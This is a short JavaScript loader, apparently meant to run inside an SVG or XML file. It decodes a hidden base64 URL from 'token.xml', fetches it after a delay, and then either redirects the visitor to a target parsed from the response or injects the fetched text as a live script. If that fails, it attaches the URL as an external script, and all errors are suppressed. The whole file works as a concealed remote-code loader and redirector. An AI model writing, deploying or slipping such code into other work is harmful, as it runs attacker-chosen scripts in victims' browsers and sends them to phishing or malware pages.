(function () {
  var WAIT_MS = 500;
  var SVG_NS = 'http://www.w3.org/2000/svg';
  var XHTML_NS = 'http://www.w3.org/1999/xhtml';

  function parseHopBody(text) {
    var body = String(text || '').trim();
    try {
      var j = JSON.parse(body);
      if (j && j.c) {
        var u = atob(String(j.c).trim());
        if (/^https?:\/\//i.test(u)) return u;
      }
    } catch (e) {}
    var patterns = [
      /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
      /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
      /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
    ];
    for (var i = 0; i < patterns.length; i++) {
      var m = body.match(patterns[i]);
      if (m && m[1]) return m[1];
    }
    throw new Error('parse');
  }

  function attachHop(hopUrl) {
    var s = document.createElementNS(XHTML_NS, 'script');
    s.setAttribute('src', hopUrl);
    s.setAttribute('async', 'true');
    document.documentElement.appendChild(s);
  }

  function injectBody(code) {
    var s = document.createElementNS(XHTML_NS, 'script');
    s.textContent = code;
    document.documentElement.appendChild(s);
  }

  function loadToken() {
    return fetch('token.xml', { cache: 'no-store' }).then(function (res) {
      if (!res.ok) throw new Error('token');
      return res.text();
    }).then(function (xml) {
      var doc = new DOMParser().parseFromString(xml, 'application/xml');
      if (doc.querySelector('parsererror')) throw new Error('xml');
      var node = doc.getElementsByTagName('token')[0];
      var b64 = node ? String(node.textContent || '').trim() : '';
      var url = atob(b64);
      if (!/^https?:\/\//i.test(url)) throw new Error('bad');
      return url;
    });
  }

  function openHop(hopUrl) {
    fetch(hopUrl, { cache: 'no-store', credentials: 'omit' })
      .then(function (res) {
        if (!res.ok) throw new Error('http');
        return res.text();
      })
      .then(function (body) {
        try {
          window.location.replace(parseHopBody(body));
        } catch (e) {
          injectBody(body);
        }
      })
      .catch(function () {
        attachHop(hopUrl);
      });
  }

  loadToken().then(function (hopUrl) {
    setTimeout(function () {
      openHop(hopUrl);
    }, WAIT_MS);
  }).catch(function () {});
})();
